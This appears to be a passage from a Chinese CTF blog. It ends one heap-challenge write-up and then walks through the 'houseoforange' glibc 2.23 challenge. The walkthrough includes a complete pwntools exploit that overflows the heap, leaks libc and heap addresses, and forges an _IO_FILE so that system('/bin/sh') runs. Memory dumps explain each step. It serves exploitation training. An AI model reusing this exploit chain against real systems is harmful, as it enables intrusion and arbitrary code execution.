<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fe67e7edae8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fe67e7edae8</span> (_IO_wide_data_0+<span class="number">296</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fe67e7edaf0</span> (_IO_wide_data_0+<span class="number">304</span>) ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fe67e7edaf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fe67e7edb00</span> (__memalign_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fe67e7edb08</span> (__realloc_hook) —▸ <span class="number">0x7fe67e46e27a</span> (do_system+<span class="number">1098</span>) ◂— mov    rax, qword ptr [rip + <span class="number">0x37ec37</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7fe67e7edb10</span> (__malloc_hook) —▸ <span class="number">0x7fe67e4ad718</span> (<span class="built_in">realloc</span>+<span class="number">8</span>) ◂— mov    r12, rsi</span><br></pre></td></tr></table></figure>
<p>top chunk 的申请没有“size”的要求，对 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的操作是为了重置栈帧</p>
<hr>
<p><strong>小结：</strong></p>
<p>这6个多小时的解题有点折磨，最后看了wp回头看本题目时，发现思路也挺清晰</p>
<p>反正我是把可能技术都尝试了一遍：</p>
<ul>
<li>首先是 leak 那里就出来问题，泄露出了“heap_addr”但是泄露不出“libc_base”（“size”的限制）</li>
<li>在此基础上，因为有 off-by-one 所以我选择打 unlink，结果当然失败了，先不管实现了 overlap 有什么用，覆盖“size-&gt;P位”的过程会把整个“size”给覆盖掉</li>
<li>使用 Double free 修改了“chunk-&gt;size”把它释放到了 unsortedbin 中，泄露了“libc_base”</li>
<li>接下来我当然想到了利用 Double free 劫持 hook，还是因为“size”的原因劫持不了（hook前面也没有“\x55”等可以劫持的地址）</li>
<li>又想到可以控制 top chunk 来打 House Of Force（size限制，排除）和 House Of Einherjar（只能控制 top chunk 前面的区域，控制不了 hook，排除）</li>
<li>House Of Orange 肯定也不行</li>
<li>FSOP 中 unsortedbin attack 勉强可以执行，但是 FSOP 需要伪造很长的IO_FILE结构体，size明显不符合条件</li>
<li>然后选择 main_arena 劫持，因为 top chunk 那里有“0x55”（main_arena+88），但是接下来只能劫持后面的 unsortedbin 了，末尾置空又会导致严重的段错误</li>
</ul>
<p>最后止步于此…………</p>
<p>看了大佬的wp，发现其核心在于把“0x61”放入 fastbin 中，而后对应的 main_arena 条目就变为了“0x61”，可以利用 Double free 申请到这里，从而可以控制 top chunk（top chunk的检查比fastbin，unsortedbin少很多）</p>
<ul>
<li>本题目使我的堆风水提高了不少（我前前后后改了不知道多少遍堆风水，最后才避免了报错）</li>
<li>另外学习到了 main_arena 劫持这门技术（限制“size”时必选）</li>
</ul>
<p>我觉得我还是缺少历练，需要多多打比赛（挨打），做题（坐牢）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/House%20Of%20Orange-2.23-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/18/House%20Of%20Orange-2.23-64/" class="post-title-link" itemprop="url">House Of Orange-2.23-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-18 01:52:29" itemprop="dateCreated datePublished" datetime="2022-03-18T01:52:29+08:00">2022-03-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-27 12:11:41" itemprop="dateModified" datetime="2022-04-27T12:11:41+08:00">2022-04-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>houseoforange</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./houseoforange</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> <span class="number">1.</span> Build the house                  </span><br><span class="line"> <span class="number">2.</span> See the house                    </span><br><span class="line"> <span class="number">3.</span> Upgrade the house                </span><br><span class="line"> <span class="number">4.</span> Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">houseoforange: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/houseoforange&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu3)</span> stable release version</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ORANGE</span> *<span class="title">org</span>;</span> <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( upgrade_cnt &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( g_house )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">      size = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">        size = <span class="number">4096</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">      read_n(g_house-&gt;name, size);              <span class="comment">// overflow</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">      org = g_house-&gt;org;</span><br><span class="line">      org-&gt;price = get_int();</span><br><span class="line">      color_menu();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange: &quot;</span>);</span><br><span class="line">      v2 = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">56746</span> &amp;&amp; (v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">7</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 == <span class="number">56746</span> )</span><br><span class="line">        g_house-&gt;org-&gt;color = <span class="number">56746</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        g_house-&gt;org-&gt;color = v2 + <span class="number">30</span>;</span><br><span class="line">      ++upgrade_cnt;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t upgrade more&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改模块的“size”可以执行控制，导致了严重的堆溢出</p>
<p><strong>入侵思路</strong></p>
<p>本程序没有释放模块，传统的入侵都失效了</p>
<p>本题目是 house of orange 的开山之作，学习本题目也就是为了学习 house of orange 和 FSOP，先挂上大佬的 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)	<span class="comment">#1-7</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)	<span class="comment">#1-7</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line">	</span><br><span class="line"><span class="comment"># get the unsortedbin</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa\n&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;a\n&#x27;</span>,<span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span> - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc.address = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line">success(<span class="string">&#x27;heap = &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)<span class="comment">#to small bin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>接下来就借这个 exp 来学习 house of orange 和 FSOP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get the unsortedbin</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa\n&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;a\n&#x27;</span>,<span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br></pre></td></tr></table></figure>
<p>函数 add 的后两个参数是凑数的，不用考虑，这里就是为了 unsortedbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55ac5249a0c0</span> —▸ <span class="number">0x7fa36d3deb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55ac5249a0c0</span></span><br></pre></td></tr></table></figure>
<p>泄露 libc_base 的过程没有什么好说的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span> - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc.address = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55cc39c6a0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span> <span class="comment">// add 0x400</span></span><br><span class="line"><span class="number">0x55cc39c6a0f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x00007ff3f687e188</span> <span class="comment">// leak libc_base</span></span><br><span class="line"><span class="number">0x55cc39c6a100</span>:	<span class="number">0x000055cc39c6a0e0</span>	<span class="number">0x000055cc39c6a0e0</span> <span class="comment">// leak heap_addr</span></span><br></pre></td></tr></table></figure>
<p>可以通过泄露 large chunk-&gt;FD_nextsize 来泄露 heap_addr：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 这里注意把&quot;\x00&quot;覆盖掉</span></span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line">success(<span class="string">&#x27;heap = &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
<p>所以 leak 已经完成，最后就是FSOP了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fake _IO_list_all(stderr) to FSOP</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment"># to 0x60 smallbin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment"># unsortedbin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment"># vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>) <span class="comment"># 执行malloc</span></span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这一大串的伪造让人摸不着头脑，但却可以达成目的（有点像SROP）</p>
<p>修改模块覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55e7fa48d4f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x55e7fa48d500</span>:	<span class="number">0x0000ddaa00001234</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d510</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000ad1</span></span><br><span class="line"><span class="number">0x55e7fa48d520</span>:	<span class="number">0x00007fd8c195bb78</span>	<span class="number">0x00007fd8c195bb78</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55e7fa48d510</span> —▸ <span class="number">0x7fd8c195bb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55e7fa48d510</span></span><br></pre></td></tr></table></figure>
<p>修改模块覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55e7fa48d4e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span> <span class="comment">// padding</span></span><br><span class="line"><span class="number">0x55e7fa48d4f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x55e7fa48d500</span>:	<span class="number">0x0000ddaa00001234</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d510</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000061</span> <span class="comment">// &quot;/bin/sh&quot; + fake_size</span></span><br><span class="line">    <span class="comment">/* 